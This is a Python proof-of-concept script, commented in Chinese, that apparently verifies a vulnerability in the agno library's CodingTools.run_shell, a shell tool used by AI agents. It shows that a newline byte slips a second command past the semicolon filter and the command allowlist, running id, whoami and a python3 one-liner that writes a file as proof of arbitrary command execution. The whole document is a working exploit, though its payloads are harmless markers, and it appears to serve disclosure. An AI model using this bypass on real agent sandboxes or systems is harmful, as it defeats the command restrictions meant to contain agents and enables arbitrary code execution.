#!/usr/bin/env python3
"""
PoC 1: 代码级验证 — 无需网络、无需 API Key

使用方法：
  cd /tmp/agno/libs/agno && pip install -e . --break-system-packages
  python3 poc_standalone.py

直接操控 CodingTools 对象，验证 _check_command 的换行符绕过。
"""

import tempfile
from pathlib import Path
from agno.tools.coding import CodingTools


def banner():
    print("=" * 64)
    print("  agno CodingTools.run_shell 换行符注入绕过 PoC")
    print("  PoC 1 — 代码级验证（无需网络 / API Key）")
    print("=" * 64)
    print()


def step1_confirm_security(tools) -> bool:
    """确认安全机制正常运作"""
    print("[1/4] 确认安全拦截正常工作...")

    r = tools.run_shell("echo hello; id")
    if "Error" not in r:
        print("  ✗ 分号注入未被拦截！漏洞可能已修复")
        return False
    print("  ✓ 分号注入拦截 ✓")

    r = tools.run_shell("whoami")
    if "Error" not in r:
        print("  ✗ whoami 未被拦截！漏洞可能已修复")
        return False
    print("  ✓ 非 allowlist 命令拦截 ✓")

    return True


def step2_newline_bypass(tools):
    """使用真正的换行字节(0x0a)绕过过滤器"""
    print("\n[2/4] 换行符注入绕过...")

    # 关键: 这里用的是 0x0a 换行字节, 不是字面反斜杠 n
    # 在 shell 中, 换行符 = 命令分隔符 (等价于 ;)
    payload = "echo hello\nid"

    # 看看 payload 的十六进制, 确认有 0x0a
    print(f"  payload (repr): {repr(payload)}")
    print(f"  payload (hex) : {payload.encode().hex()}")

    r = tools.run_shell(payload)
    print(f"  结果:\n{r}")

    if "uid=" in r:
        print("  ✓ 换行符注入成功！id 命令被执行")
        return True
    else:
        print("  ✗ 未检测到 id 执行")
        return False


def step3_bypass_allowlist(tools):
    """验证第二个命令不经过 allowlist"""
    print("\n[3/4] 绕过 allowlist 检查...")
    print("  whoami 不在 DEFAULT_ALLOWED_COMMANDS 中")

    payload = "echo hello\nwhoami"
    r = tools.run_shell(payload)

    if "xcy" in r or "root" in r:
        print(f"  结果:\n{r}")
        print("  ✓ whoami 被执行（绕过 allowlist）")
        return True
    else:
        print(f"  结果: {r.strip()}")
        print("  ✗ whoami 未被执行")
        return False


def step4_rce(tools):
    """写入文件证明 RCE"""
    print("\n[4/4] 任意代码执行（RCE）...")

    with tempfile.TemporaryDirectory() as tmp:
        marker = Path(tmp) / "RCE_CONFIRMED.txt"
        payload = (
            "echo hello\n"
            f"python3 -c \"open('{marker}','w').write('pwned_by_newline')\""
        )
        r = tools.run_shell(payload)
        print(f"  结果: {r.strip()}")

        if marker.exists():
            print(f"  文件: {marker} → '{marker.read_text()}'")
            print()
            print("  ╔══════════════════════════════════════════╗")
            print("  ║  任意命令执行（RCE）验证成功！          ║")
            print("  ╚══════════════════════════════════════════╝")
            return True
        else:
            print("  ✗ 文件未创建")
            return False


def main():
    banner()

    with tempfile.TemporaryDirectory() as tmp:
        base_dir = Path(tmp)
        print(f"[*] 沙箱目录: {base_dir}")
        print()

        tools = CodingTools(base_dir=base_dir, restrict_to_base_dir=True)

        ok = step1_confirm_security(tools)
        if not ok:
            print("\n[-] 安全机制异常，中止")
            exit(1)

        ok2 = step2_newline_bypass(tools)
        ok3 = step3_bypass_allowlist(tools)
        ok4 = step4_rce(tools)

        print()
        print("=" * 64)
        if ok2 and ok3 and ok4:
            print("  [!!!] 验证结论: 漏洞存在")
            print("        换行符可绕过 _check_command 过滤器")
            print("        第二条命令不经过 allowlist 验证")
            print("        可实现任意命令执行（RCE）")
        else:
            print("  [-] 部分步骤失败，参见上方输出")
        print("=" * 64)


if __name__ == "__main__":
    main()
